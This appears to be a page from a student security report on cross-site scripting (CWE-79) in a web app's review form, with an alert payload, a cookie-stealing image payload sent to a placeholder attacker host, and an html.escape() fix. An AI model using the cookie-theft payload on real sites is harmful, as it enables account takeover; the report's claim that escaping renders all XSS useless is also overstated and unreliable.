<div align="center">
    <h1>CWE-79</h1>
    <i>
        Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
    </i>
</div>

<br>

## Description

The application does not properly sanitize user input before displaying it on the web page. This can lead to the execution of malicious code.


<br>

## Exploit
This exploit is possible if the user input is displayed on the page, in our case the input is in "Write a review", which will show up in "Reviews".

Most importantly, it will only work if the input is not sanitized, i.e. characters that can mean something in HTML, such as `<` `>` (used in tags), **cannot be displayed in plaintext**.

<br>

## Consequences
In the "Write a review" section, if we try to enter in the name field an HTML image tag with the `onload` parameter:

```html
<img src="image_url.png" onload="alert('pwned')">
```

![](/analysis/CWE-79/insecure_xss.gif)

It worked! An attacker can use a different script to, for example, **send the user's cookies to his private server**:

```html
<img src=x onerror="this.src='http://attacker_ip:attacker_port/?'+document.cookie; this.removeAttribute('onerror');">
```

With this, the attacker can enter the active user login, effectively **taking control of the account**.

<br>

## Mitigation

To prevent such exploit, it is necessary to **escape** certain characters. This means converting characters that can affect the page's HTML structure, such as **`<`, `>`, and `&`**.

To do this, we used python's built-in package called `html`.

With `html.escape()` function, the characters `<`, `>`, and `&` are converted to `&lt;`, `&gt;`, and `&amp;`, respectively.

Just to be sure, we also wrap the input with quotation marks, so that all possibly dangerous attack attempts are parsed as a string.

This renders all XSS attacks useless.

![](/analysis/CWE-79/secure_xss.gif)

---

<div align="center">
<i>
    <a href="/report/README.md">Back to report</a>
</i>
</div>
